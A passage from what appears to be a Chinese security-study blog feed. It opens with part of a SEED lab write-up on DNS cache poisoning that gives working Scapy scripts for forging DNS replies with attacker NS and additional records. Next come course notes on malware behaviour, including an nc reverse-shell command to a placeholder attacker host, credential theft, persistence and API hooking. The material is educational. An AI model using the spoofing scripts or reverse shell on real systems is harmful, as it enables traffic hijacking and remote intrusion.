class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>        <span class="hljs-comment"># 打印DNS查询信息</span><br>        <span class="hljs-built_in">print</span>(pkt.sprintf(<span class="hljs-string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))<br><br>        <span class="hljs-comment"># 构造IP、UDP和DNS层</span><br>        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)<br>        udp = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)<br><br>        <span class="hljs-comment"># 构造ANSWER SECTION</span><br>        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, rdata=<span class="hljs-string">&#x27;1.2.3.4&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># The Authority Section</span><br>        NSsec = DNSRR(rrname=<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=<span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br>        NSsec1 = DNSRR(rrname=<span class="hljs-string">&#x27;google.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=<span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br><br><br>        <span class="hljs-comment"># 构造DNS响应数据包</span><br>        dns = DNS(<span class="hljs-built_in">id</span>=pkt[DNS].<span class="hljs-built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, an=Anssec, nscount=<span class="hljs-number">2</span>, ns=NSsec/NSsec1)<br><br>        <span class="hljs-comment"># 构造伪造的数据包</span><br>        spoofpkt = ip/udp/dns<br><br>        <span class="hljs-comment"># 发送伪造的DNS响应</span><br>        send(spoofpkt)<br><br><span class="hljs-comment"># 设置过滤条件，监听local-dns-server向上级DNS服务器发起的请求包</span><br>myFilter = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span><br><br><span class="hljs-comment"># 使用Scapy的sniff函数捕获符合过滤条件的数据包，并调用spoof_dns函数进行处理</span><br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-117c9837158d&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof_dns)<br></code></pre></td></tr></table></figure></li><li><p>未启动攻击，用户进行DNS查询，返回正确结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048558.png"alt="image-20231129104144953" /><figcaption aria-hidden="true">image-20231129104144953</figcaption></figure></li><li><p>清除本地DNS服务器缓存，发起攻击，用户进行DNS查询，返回的IP地址是攻击服务器中的结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048559.png"alt="image-20231129104214752" /><figcaption aria-hidden="true">image-20231129104214752</figcaption></figure></li><li><p>查看本地DNS服务器缓存，存在伪造的NS记录，实验中仅会保存第一条。理论上，应该是缓存所有区域内的记录。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048560.png"alt="image-20231129104306797" /><figcaption aria-hidden="true">image-20231129104306797</figcaption></figure></li></ol><h2 id="task-5-spoofing-records-in-the-additional-section">3.5 Task 5:Spoofing Records in the Additional Section</h2><p>在 DNS 回复中，有一个名为 "附加部分 "的部分，用于提供附加信息。在实践中，它主要用于为某些主机名提供 IP 地址，尤其是那些出现在 "授权"部分的主机名。本任务的目标是伪造该部分中的某些条目，看看目标本地 DNS服务器是否会成功缓存这些条目。具体来说，在回复 www.example.com的查询时，除了答案部分的条目外，我们还会在欺骗回复中添加以下条目:</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048561.png"alt="image-20231129104448770" /><figcaption aria-hidden="true">image-20231129104448770</figcaption></figure><p>条目 ➀ 和 ➁ 与权限部分中的主机名有关。条目➂与回复中的任何条目完全无关，但它为用户提供了 "亲切"的帮助，使他们无需查找 Facebook 的 IP 地址。请使用 Scapy 来欺骗这样的DNS回复。您的任务是报告哪些条目将被成功缓存，哪些条目不会被缓存；请解释原因。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>编写代码：基于task3进行修改，增加NS条目，额外信息条目，同时修改DNS响应数据包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spoof_dns</span>(<span class="hljs-params">pkt</span>):<br>    <span class="hljs-comment"># 检查数据包中是否包含DNS层，以及查询域名是否为 &#x27;example.com&#x27;</span><br>    <span class="hljs-keyword">if</span> DNS <span class="hljs-keyword">in</span> pkt <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;example.com&#x27;</span> <span class="hljs-keyword">in</span> pkt[DNS].qd.qname.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>):<br>        <span class="hljs-comment"># 打印DNS查询信息</span><br>        <span class="hljs-built_in">print</span>(pkt.sprintf(<span class="hljs-string">&quot;&#123;DNS: %IP.src% --&gt; %IP.dst%: %DNS.id%&#125;&quot;</span>))<br><br>        <span class="hljs-comment"># 构造IP、UDP和DNS层</span><br>        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)<br>        udp = UDP(dport=pkt[UDP].sport, sport=<span class="hljs-number">53</span>)<br><br>        <span class="hljs-comment"># 构造ANSWER SECTION</span><br>        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, rdata=<span class="hljs-string">&#x27;1.2.3.4&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># The Authority Section</span><br>        NSsec1 = DNSRR(rrname=<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=<span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br>        NSsec2 = DNSRR(rrname=<span class="hljs-string">&#x27;example.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;NS&#x27;</span>, rdata=<span class="hljs-string">&#x27;ns.example.com&#x27;</span>, ttl=<span class="hljs-number">259200</span>)<br><br>        <span class="hljs-comment"># The Additional Section</span><br>        Addsec1 = DNSRR(rrname=<span class="hljs-string">&#x27;ns.attacker32.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">&#x27;1.2.3.4&#x27;</span>)<br>        Addsec2 = DNSRR(rrname=<span class="hljs-string">&#x27;ns.example.net&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">&#x27;5.6.7.8&#x27;</span>)<br>        Addsec3 = DNSRR(rrname=<span class="hljs-string">&#x27;www.facebook.com&#x27;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">&#x27;A&#x27;</span>, ttl=<span class="hljs-number">259200</span>, rdata=<span class="hljs-string">&#x27;3.4.5.6&#x27;</span>)<br><br>        <span class="hljs-comment"># 构造DNS响应数据包</span><br>        dns = DNS(<span class="hljs-built_in">id</span>=pkt[DNS].<span class="hljs-built_in">id</span>, qd=pkt[DNS].qd, aa=<span class="hljs-number">1</span>, rd=<span class="hljs-number">0</span>, qr=<span class="hljs-number">1</span>, qdcount=<span class="hljs-number">1</span>, ancount=<span class="hljs-number">1</span>, an=Anssec,<br>                  nscount=<span class="hljs-number">2</span>, ns=NSsec1/NSsec2, arcount=<span class="hljs-number">3</span>, ar=Addsec1/Addsec2/Addsec3)<br><br>        <span class="hljs-comment"># 构造伪造的数据包</span><br>        spoofpkt = ip/udp/dns<br><br>        <span class="hljs-comment"># 发送伪造的DNS响应</span><br>        send(spoofpkt)<br><br><span class="hljs-comment"># 设置过滤条件，监听local-dns-server向上级DNS服务器发起的请求包</span><br>myFilter = <span class="hljs-string">&#x27;udp and (src host 10.9.0.53 and dst port 53)&#x27;</span><br><br><span class="hljs-comment"># 使用Scapy的sniff函数捕获符合过滤条件的数据包，并调用spoof_dns函数进行处理</span><br>pkt = sniff(iface=<span class="hljs-string">&#x27;br-117c9837158d&#x27;</span>, <span class="hljs-built_in">filter</span>=myFilter, prn=spoof_dns)<br></code></pre></td></tr></table></figure></li><li><p>未启动攻击，用户进行DNS查询，返回正确结果。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048562.png"alt="image-20231129104615121" /><figcaption aria-hidden="true">image-20231129104615121</figcaption></figure></li><li><p>清除本地DNS服务器缓存，发起攻击，用户进行DNS查询，返回攻击服务器设置的IP地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048563.png"alt="image-20231129104648543" /><figcaption aria-hidden="true">image-20231129104648543</figcaption></figure></li><li><p>wireshark抓包，成功抓取到伪造的响应包。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048564.png"alt="image-20231129104725799" /><figcaption aria-hidden="true">image-20231129104725799</figcaption></figure></li><li><p>查看本地DNS服务器缓存。结果如下：两条NS记录均成功缓存；附加记录均没有被成功缓存。理论上，区域内的记录都会被缓存。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311291048565.png"alt="image-20231129104744376" /><figcaption aria-hidden="true">image-20231129104744376</figcaption></figure></li></ol><h1 id="guideline">4. Guideline</h1><p>在本实验室中，您需要使用 Scapy完成几项任务。下面的示例代码展示了如何嗅探 DNS 查询，然后伪造 DNS回复，其中包括答案部分的一条记录、授权部分的两条记录和附加部分的两条记录。该代码已包含在Labsetup.zip 文件中（卷文件夹内）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281517201.png"alt="image-20231228151244879" /><figcaption aria-hidden="true">image-20231228151244879</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312281517203.png"alt="image-20231228151311391" /><figcaption aria-hidden="true">image-20231228151311391</figcaption></figure><p>请确保将第 ✩行中的接口名称替换为您系统中的接口名称。第✱ 行构建 DNS有效负载，包括 DNS 标头和数据。DNS有效负载的每个字段将在下文中解释：</p><ul><li>id：事务 ID；应与请求中的 ID 相同</li><li>qd：查询域；应与请求中的查询域相同</li><li>aa：权威答案（1 表示答案包含权威答案）</li><li>rd：希望递归（0 表示禁用递归查询）</li><li>qr：查询响应位（1 表示响应）</li><li>qdcount：查询域的数量</li><li>ancount：答案部分的记录数量</li><li>nscount：授权部分的记录数量</li><li>arcount：附加部分的记录数量</li><li>an: 答案部分</li><li>ns：权限部分</li><li>ar：附加部分</li></ul>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Network Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH06-恶意代码行为</title>
    <link href="/2023/11/27/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH06%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/"/>
    <url>/2023/11/27/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH06%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E8%A1%8C%E4%B8%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="下载器和启动器">1. 下载器和启动器</h1><h2 id="下载器">1.1 下载器</h2><ul><li>定义：这是一类只是用来下载其他恶意代码的恶意代码。下载器通常是在攻击者获得系统的访问时首先进行安装的。下载器程序会下载和安装其他的恶意代码。</li><li>特点：<ul><li>常用WindowsAPI函数：<code>URLDownloadtoFileA</code>和<code>WinExec</code></li><li>短小精干、功能单一、防查杀</li></ul></li></ul><h2 id="启动器">1.2 启动器</h2><ul><li>定义：用来启动其他恶意程序的恶意代码。通常情况下，启动器使用一些非传统的技术，来启动其他恶意程序，以确保其隐蔽性，或者以更高权限访问系统。</li></ul><h1 id="后门">2. 后门</h1><ul><li>绕过正常的安全控制机制，为攻击者提供远程访问受害主机的途径；</li><li>最常见的恶意代码，实现了全套功能，不需要下载额外的恶意代码；</li><li>通信方式多种多样，常用端口80（HTTP协议）、53（DNS)；</li><li>查看后门使用和导入的Windows函数，可以确定其功能；</li><li>同类应用：木马、远程控制、僵尸网络。</li></ul><h2 id="反向shell">2.1 反向shell</h2><ul><li>反向shell是从被感染机器上发起一个连接，它提供攻击者shell访问被感染机器的权限。</li><li>存在方式：<ul><li>单独的一个恶意代码</li><li>一个复杂后门程序中的组件</li></ul></li><li>攻击者能够如同在本地系统上一样运行命令。</li></ul><p><strong>nc反向shell：</strong></p><ul><li>攻击机：<code>nc -lvp 443</code></li><li>受害机：<code>nc attack_ip 443 -e cmd.exe</code></li></ul><p><strong>Windows反向shell：</strong></p><ul><li>基础方法：<ul><li>创建一个套接字，并与服务器建立连接；</li><li>绑定这个套接字与cmd.exe标准流（stdin、stdout、stderro）；</li><li>调用CreateProcess用隐藏窗口的方式创建cmd.exe。</li></ul></li><li>多线程技术：<ul><li>创建一个套接字、两个管道CreatePipe和两个线程CreateThread；</li><li>CreatePipe用来绑定一个管道的读写端（stdin、stdout）；</li><li>CreateProcess用来绑定一个管道与标准流，不直接与套接字绑定；</li><li>调用CreateProcess，恶意代码会产生两个线程：一个线程从标准输入管道读数据，并且向套接字写数据；另一个线程用来从一个套接字读数据，并且向一个标准输出管道写数据。</li></ul></li></ul><h2 id="远程控制工具">2.2 远程控制工具</h2><p>只要在被控者电脑安装一个服务端，即可在不知情的情况下控制对方计算机以及对计算机进行其它操作，控制时不需要经过对方的许可就可以控制，而控制时操作的一些动作，对方也无法察觉到。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602552.png"alt="image-20231127145043375" /><figcaption aria-hidden="true">image-20231127145043375</figcaption></figure><h2 id="僵尸网络">2.3 僵尸网络</h2><ul><li>僵尸程序是用于构建僵尸网络以形成大规模攻击平台的恶意代码;</li><li>僵尸网络是被黑客集中控制的计算机群，其核心特点是黑客能够通过一对多的命令与控制信道操纵感染僵尸程序的主机执行相同的恶意行为;</li><li>可同时对某目标网站进行分布式拒绝服务攻击，或发送大量的垃圾邮件等；</li><li>按照使用的通信协议，僵尸程序可进一步分为:IRC僵尸程序、HTTP僵尸程序、P2P僵尸程序和其它僵尸程序四类。</li></ul><h2 id="区别">2.4 区别</h2><ul><li>僵尸网络感染和控制数以百万计的主机。远程控制工具通常只控制很少量的主机；</li><li>僵尸网络中的所有主机在同一时刻被控制，而远程控制工具是以每个受害者为单位进行远程控制，因为远程控制工具要求攻击者与受害主机之间更紧密的交互；</li><li>远程控制工具被用来执行针对性的攻击，而僵尸网络用来进行大规模攻击。</li></ul><h1 id="登录凭证窃取器">3. 登录凭证窃取器</h1><p>主要有三种类型的恶意代码：</p><ul><li>等待用户登录以窃取登录凭证的程序</li><li>转储Windows系统中存放信息的程序</li><li>击键记录程序</li></ul><h2 id="gina拦截">3.1 GINA拦截</h2><p><strong>原理：</strong></p><ul><li>GINA：图形识别和验证</li><li>GINA在msgina.dll中实现，这个DLL在用户登录系统过程中由Winlogon可执行文件加载。</li><li>Windows操作系统中Winlogon进程负责管理与登录和身份认证相关的安全性工作，包括处理用户的登录与注销、启动用户shell、输入口令、更改口令、锁定与解锁等。</li><li>GINA的设计目的是让合法第三方通过添加一些代码，来自定义登录过程，如用硬件无线射频标识令牌或者智能卡来进行身份认证。</li><li>攻击者利用GINA对第三方的支持来加载窃密器。</li></ul><p><strong>实现：</strong></p><ul><li><p>在Winlogon与GINA DLL（msgina.dll）之间加载第三方DLL。</p></li><li><p>恶意文件fsgina.dll位于系统文件间直接截获数据。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602553.png"alt="image-20231127150719215" /><figcaption aria-hidden="true">image-20231127150719215</figcaption></figure></li></ul><h2 id="口令哈希转储">3.2 口令哈希转储</h2><p><strong>Windows口令加密机制：</strong></p><ul><li>LM-Hash</li><li>NTLM-Hash</li></ul><p><strong>pwdump：</strong></p><ul><li><p>作用：从安全账户管理器（SAM）输出本地账户的LM和NTLM口令哈希。</p></li><li><p>原理：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602555.png"alt="image-20231127151522576" /><figcaption aria-hidden="true">image-20231127151522576</figcaption></figure></li></ul><h2 id="击键记录">3.3 击键记录</h2><p><strong>内核空间的击键记录器：</strong></p><ul><li>键盘类设备驱动：KbdClass被称为键盘类设备驱动。不管是USB键盘，还是PS/2键盘均经过它，所以在这层做拦截，能获得很好的通用性。</li><li>原理：把自己的设备对象绑定在KbdClass设备对象之上。那么发送到KbdClass的IRP（I/O请求包）都会先经过自己的设备对象，攻击者可以在读派遣函数中设置完成例程，当IRP完成后在完成例程中得到按键信息。</li></ul><p><strong>用户空间的击键记录器：</strong></p><ul><li><p>挂钩：在键盘每次按下时用WindowsAPI通知恶意代码，通常使用SetWindowsHookEx安装挂钩。</p></li><li><p>轮询：使用WindowsAPI不断地轮询按键的状态，它通常使用函数<code>GetAsynKeyState</code>和<code>GetForegroundWindow</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602556.png"alt="image-20231127152441232" /><figcaption aria-hidden="true">image-20231127152441232</figcaption></figure></li></ul><p><strong>通过字符串列表识别击键记录器：</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[up]</span><br><span class="hljs-string">[Num Lock]</span><br><span class="hljs-string">[Down]</span><br><span class="hljs-string">[Right]</span><br><span class="hljs-string">[Up]</span><br><span class="hljs-string">[Left]</span><br><span class="hljs-string">[PageDown]</span><br></code></pre></td></tr></table></figure><h1 id="存活机制">4. 存活机制</h1><ul><li>存活：一旦恶意代码获取系统的控制权限，它通常就会在系统中驻留很长一段时间，这种行为被称为存活。</li><li>存活方法：<ul><li>修改注册表</li><li>特洛伊木马化系统二进制文件</li><li>dll加载顺序劫持</li></ul></li></ul><h2 id="windows注册表">4.1 Windows注册表</h2><p><strong>AppInit_DLL:</strong></p><p>AppInit_DLL中的DLL程序会在进程加载User32.dll时被加载</p><p><strong>Winlogon：</strong></p><p>恶意代码编写者可以挂钩一个特殊的Winlogon事件，如登录、注销、关机以及锁屏等等。</p><p><strong>svchost dll：</strong></p><ul><li>svchost本身只是作为服务宿主，并不实现任何服务功能；</li><li>需要svchost启动的服务以动态链接库形式实现，在安装这些服务时，把服务的可执行程序指向svchost；</li><li>启动这些服务时由svchost调用相应服务的动态链接库来启动服务。</li></ul><h2 id="特洛伊木马化trojanized系统二进制文件">4.2特洛伊木马化（Trojanized）系统二进制文件</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602557.png"alt="image-20231127153937137" /><figcaption aria-hidden="true">image-20231127153937137</figcaption></figure><ul><li>通常修改一个系统文件的函数入口点，使它调转到恶意代码。</li><li>当被感染的二进制文件下次运行或者加载时，将会强制运行恶意代码。</li></ul><h2 id="dll加载顺序劫持">4.3 DLL加载顺序劫持</h2><p>DLL加载顺序劫持允许恶意代码编写者在不使用注册表项或者特洛伊二进制文件的前提下创建一个存活的、恶意的DLL程序。这种技术甚至不需要单独的恶意加载器，因为它有能力让Windows加载他。</p><p>如果应用程序开发人员希望从C:WindowsSystem32加载DLL，但在应用程序中没有明确写入，那么就会在搜索System32中的合法DLL之前，先加载应用程序目录中被植入的恶意DLL。这种恶意DLL加载方式被称为DLL劫持，攻击者以这种方式将恶意代码加载到受信任或已签名的应用程序中。</p><p><strong>Windows XP加载DLL的默认顺序</strong></p><ol type="1"><li>应用程序所在目录；</li><li>当前目录：GetCurrentDirectory返回的目录；</li><li>系统目录：GetSystemDirectory返回的目录，通常是系统盘<code>..\Windows\System32</code>；</li><li>16位系统目录：该项只是为了向前兼容的处理，可以不考虑；</li><li>Windows目录：GetWindowsDirectory返回的目录，通常是系统盘<code>.. \Windows</code>；</li><li>环境变量PATH中所有目录。</li></ol><p>参考链接：<ahref="https://www.anquanke.com/post/id/209563">探索DLL搜索顺序劫持的原理和自动化侦查方法</a></p><h1 id="提权">5. 提权</h1><p><strong>SeDebugPrivilege：</strong></p><ul><li>访问令牌（accesstoken）包含进程安全描述符的对象，指定拥有者的访问权限；</li><li>SeDebugPrivilege特权作为一个系统级别调试的工具被创建；</li><li>SeDebugPrivilege特权只赋值给本地管理员账户，等同于本地系统账户权限；普通用户账号不能给自身赋予该权限，请求汇报拒绝；</li><li>拥有SeDebugPrivilege特权，可以调用TerminateProcess和CreateRemoteThread等函数；</li></ul><h1 id="隐藏它的踪迹-用户态的rootkit">6.隐藏它的踪迹-用户态的Rootkit</h1><ul><li>Rootkit：是一种特殊的恶意软件，它的功能是<strong>在安装目标上隐藏自身及指定的文件、进程和网络链接等信息</strong>，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。</li><li>Rootkit分类<ul><li>固件化Rootkit和BIOS Rootkit</li><li>内核级Rootkit</li><li>用户态Rootkit</li><li>应用级Rootkit</li><li>代码库Rootkit</li><li>虚拟化Rootkit与Hypervisor Rootkit</li></ul></li><li>用户态下，应用程序会调用 Win32 子系统动态库（包括Kernel32.dll、User32.dll、 Gdi32.dll等） 提供的Win32API函数，它们是Windows提供给应用程序与操作系统的接口，运行在Ring 3级。（ cpu的特权级别：Ring 0 ~ Ring 3）</li><li>用户级 Rootkit 通常就是通过拦截 Win32API，建立系统钩子（hook），插入自己的代码，从而控制检测工具对进程或服务的遍历调用，实现隐藏功能。</li></ul><h2 id="iat-hook">6.1 IAT Hook</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602558.png"alt="image-20231127155503886" /><figcaption aria-hidden="true">image-20231127155503886</figcaption></figure><ul><li>这种挂钩方法修改导入地址表或导出地址表</li><li>上面的路径是正常执行流，下面路径是加入Rootkit后的执行流。</li><li>IATHook时如果要钩取的API不在IAT中(LoadLibrary后调用)，则无法使用该技术。</li><li>过时且容易探测的挂钩方式，现代的Rootkit都使用更高级的inlineHook。</li></ul><p><strong>Detours：</strong></p><ul><li>Detours是微软开发的一个函数库，可用于捕获系统API，也就是一个用于在Windows上监视和检测API调用的软件包。</li><li>Detours现在可以在标准的开源许可证（MIT）下使用。这简化了使用Detours的程序员的许可，并允许社区使用开源工具和流程支持Detours。</li></ul><h2 id="inline-hook">6.2 Inline Hook</h2><ul><li>原理：<ul><li>InlineHook是通过覆盖导入DLL中API函数的代码来实现的，所以它必须等到DLL被加载后才能执行。IATHook只简单的修改函数指针，但inline Hook将修改实际的函数代码。</li><li>就是对函数执行流程进行修改，达到控制函数过滤操作的目的。理论上可以在函数任何地方把原来指令替换成hook的跳转指令，来躲避inlinehook的检测。前提是必须对函数的流程和指令非常熟悉，且这种深层次的inline不具有通用性，稳定性也是问题。</li><li>Inlinehook原理：解析函数开头的几条指令，把它们Copy到数组保存起来，然后用一个调用hook函数的几条指令来替换，如果要执行原函数，则在hook函数处理完毕，再执行保存起来的开头几条指令，然后调回取指令之后的地址执行。</li></ul></li><li>流程：<ul><li>构造跳转指令，即jmp MyProc。</li><li>在内存中找到欲HOOK函数的地址（这可以通过使用GetProcAddress()函数实现），然后保存欲HOOK位置处的前5个字节（跳转指令需占用5个字节）。</li><li>将构造的跳转指令写入需要HOOK的位置处，这样当被HOOK的位置执行时，就会跳转到新的函数执行。</li><li>如果要执行原来的函数，那么需要取消HOOK，还原第（2）步中保存的5个字节。</li><li>执行原来的流程。</li></ul></li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311271602559.png"alt="image-20231127160213042" /><figcaption aria-hidden="true">image-20231127160213042</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH05-分析恶意Windows程序</title>
    <link href="/2023/11/25/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH05%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/"/>
    <url>/2023/11/25/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E7%90%86%E8%AE%BA%E7%AF%87/CH05%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">0. 引言</h1><ul><li>多数恶意代码与操作系统进行紧密交互；</li><li>对Windows编程概念的深刻理解，能帮助识别主机上的感染现象和跟踪恶意代码的执行；</li><li>正常代码总体上是由编译器良好的生成，并且遵循微软的指导原则；</li><li>恶意代码通常结构很差，并且趋向于执行预期之外的动作。</li></ul><h1 id="windows-api">1. Windows API</h1><ul><li>一个广泛的功能集合</li><li>管理（恶意）代码与微软程序库之间的交互方式</li><li>功能强大</li></ul><h2 id="类型与匈牙利表示法">1.1 类型与匈牙利表示法</h2><ul><li>多数WindowsAPI使用自己的名字来表示C语言类型，标准C类型如int、short通常不使用</li><li>Windows总体使用匈牙利表示法作为API函数标识符</li><li>表达式使用一个前缀命名模式，来识别一个变量的类型</li><li>一个32位无符号整数的变量，或DWORD，会以dw开头</li></ul><p><strong>Windows API中的常见类型：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311251523402.png"alt="image-20231125140512261" /><figcaption aria-hidden="true">image-20231125140512261</figcaption></figure><h2 id="句柄">1.2 句柄</h2><ul><li>在操作系统中被打开或被创建的项</li><li>窗口、进程、模块、菜单、文件、管道、端口、互斥量等</li><li>有点像引用对象或其他某个内存位置的指针，但不能进行数学操作，也不总是表示对象地址；后续可以使用它来引用同一对象</li></ul><h2 id="文件系统">1.3 文件系统</h2><ul><li>恶意代码与系统交互的一个最常用的方式是访问文件系统：创建或修改文件。</li><li>创建独特文件名或修改为既有的文件名，这是明显的恶意代码行为。</li></ul><p><strong>文件系统函数：</strong></p><ul><li>CreateFile和OpenFile（文件、管道、流，以及I/O设备）</li><li>ReadFile和WriteFile（对文件的读和写，都将文件作为流来操作）</li><li>CreateFileMapping和MapViewofFile（文件映射）<ul><li>前者从磁盘加载文件到内存；后者返回一个指向映射的基地址指针，可用来访问内存中的文件。</li><li>文件映射被普遍用来复制Windows加载器功能，加载到内存后解析PE文件头，并对内存中的文件进行所需要的修改</li></ul></li></ul><h2 id="特殊文件">1.4 特殊文件</h2><ul><li>访问方式与普通文件不一样：不能通过盘符与文件夹进行访问；</li><li>有些比普通文件更隐蔽：在列目录时不会显示出来；</li><li>有些可以提供对系统硬件和内部数据更强的访问能力；</li><li>可以作为字符串参数被传递给任何文件操作函数，并像普通文件一样进行操作。</li></ul><h3 id="共享文件">1.4.1 共享文件</h3><ul><li>以<code>\\serverName\share</code>或<code>\\?\serverName\share</code>开头命名的文件；</li><li>用来访问保存在共享目录中的目录或文件；</li><li><code>\\?\</code>前缀告诉操作系统禁用所有的字符串解析，并允许访问文件名。</li></ul><h3 id="通过名字空间访问的文件">1.4.2 